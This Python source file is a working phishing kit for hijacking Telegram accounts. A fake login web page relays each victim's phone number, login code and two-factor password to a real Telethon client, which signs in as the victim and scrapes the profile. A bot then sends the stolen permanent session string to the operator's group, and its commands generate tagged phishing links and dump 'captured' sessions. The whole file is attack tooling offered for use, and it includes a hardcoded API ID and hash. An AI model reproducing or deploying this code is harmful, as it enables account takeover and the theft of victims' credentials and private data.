import os
import asyncio
import telebot
import qrcode
import base64
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
# Pulled from Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")

# Standardize GROUP_ID to handle the -100 prefix
try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Global storage for active client sessions and logs
active_relays = {} 
captured_list = [] 

# --- UTILITY FUNCTIONS ---

async def scrape_full_data(client, phone):
    """Gathers user details and generates a permanent Session String."""
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        session_str = client.session.save()
        
        data = {
            "name": f"{me.first_name} {me.last_name or ''}".strip(),
            "id": me.id,
            "username": f"@{me.username}" if me.username else "None",
            "bio": full_user.full_user.about or "No Bio",
            "premium": "✅ Yes" if me.premium else "❌ No",
            "session": session_str,
            "phone": phone
        }
        return data
    except Exception as e:
        print(f"Scraping failed: {e}")
        return None

def safe_send(chat_id, text):
    """Sends bot messages without crashing the web process if Telegram fails."""
    try:
        bot.send_message(chat_id, text, parse_mode="HTML")
    except Exception as e:
        print(f"Telegram Bot Send Error: {e}")

# --- BOT COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>VinzyStore Relay System</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>.help</code> - Show this menu\n"
        "• <code>.link [label]</code> - Create your relay link\n"
        "• <code>.list</code> - Show all captured phones\n"
        "• <code>.profile [phone]</code> - Dump session & info\n"
        "• <code>.info</code> - Check server status\n"
    )
    safe_send(m.chat.id, help_text)

@bot.message_handler(func=lambda m: m.text == '.list')
def handle_list(m):
    if m.chat.id != GROUP_ID: return
    if not captured_list:
        return safe_send(m.chat.id, "⚠️ <b>Database is empty.</b>")
    
    msg = f"📋 <b>Captured Hits: {len(captured_list)}</b>\n\n"
    for num in captured_list:
        name = active_relays.get(num, {}).get('info', {}).get('name', 'User')
        msg += f"👤 {name} -> <code>{num}</code>\n"
    safe_send(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text.startswith('.link'))
def create_link(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(' ')
    label = parts[1] if len(parts) > 1 else "default"
    
    # Builds the link with your Group ID so logs come here
    relay_url = f"{BASE_URL.rstrip('/')}/?id={GROUP_ID}&tag={label}"
    
    response = (
        "🔗 <b>New Relay Link</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"🌐 <b>URL:</b> <code>{relay_url}</code>\n"
        f"🏷️ <b>Tag:</b> <code>{label}</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    safe_send(m.chat.id, response)

@bot.message_handler(func=lambda m: m.text.startswith('.profile'))
def profile_lookup(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(' ')
    if len(parts) < 2: return safe_send(m.chat.id, "❌ Use: <code>.profile [phone]</code>")
    
    target = parts[1]
    if target in active_relays and "info" in active_relays[target]:
        info = active_relays[target]['info']
        msg = (
            f"💎 <b>DATA DUMP: {target}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {info['name']}\n"
            f"🆔 <b>ID:</b> <code>{info['id']}</code>\n"
            f"🏷️ <b>User:</b> {info['username']}\n"
            f"🌟 <b>Premium:</b> {info['premium']}\n"
            f"📖 <b>Bio:</b> {info['bio']}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔑 <b>SESSION:</b>\n<code>{info['session']}</code>"
        )
        safe_send(m.chat.id, msg)
    else:
        safe_send(m.chat.id, "❌ Target data not found.")

@bot.message_handler(func=lambda m: m.text == '.info')
def server_info(m):
    if m.chat.id != GROUP_ID: return
    status = (
        "⚙️ <b>Server Status</b>\n"
        f"🚀 <b>Uptime:</b> Online\n"
        f"📡 <b>Active:</b> {len(active_relays)}\n"
        f"📈 <b>Total:</b> {len(captured_list)}"
    )
    safe_send(m.chat.id, status)

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id', str(GROUP_ID))
    return await render_template('login.html', tid=tid)

@app.route('/get_qr', methods=['POST'])
async def get_qr():
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        qr_login = await client.qr_login()
        img = qrcode.make(qr_login.url)
        buf = BytesIO()
        img.save(buf, format="PNG")
        img_str = base64.b64encode(buf.getvalue()).decode()
        active_relays["qr_temp"] = {"client": client}
        return jsonify({"status": "success", "qr_image": img_str})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        
        # Log to group but don't wait for it
        safe_send(target_chat, f"🎯 <b>Phone Submitted:</b>\n<code>{phone}</code>")
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    if phone not in active_relays: 
        return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            active_relays[phone]["info"] = user_data
            if phone not in captured_list: captured_list.append(phone)
            
            log = f"💰 <b>LOGIN SUCCESS!</b>\n👤 {user_data['name']}\n📱 <code>{phone}</code>\n🔑 <code>{user_data['session']}</code>"
            safe_send(target_chat, log)
        
        return jsonify({"status": "success"})
        
    except errors.SessionPasswordNeededError:
        # Move to 2FA Step on the web
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    if phone not in active_relays: 
        return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            active_relays[phone]["info"] = user_data
            log = f"🔓 <b>2FA BYPASS SUCCESS!</b>\n👤 {user_data['name']}\n🔑 <code>{user_data['session']}</code>"
            safe_send(target_chat, log)
            
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- RUNNER ---
def start_bot():
    print(f"Bot active in Group: {GROUP_ID}")
    bot.infinity_polling()

if __name__ == "__main__":
    # Start Telegram Bot in a separate thread
    Thread(target=start_bot).start()
    # Start Quart Web Server
    app.run(host="0.0.0.0", port=8000)
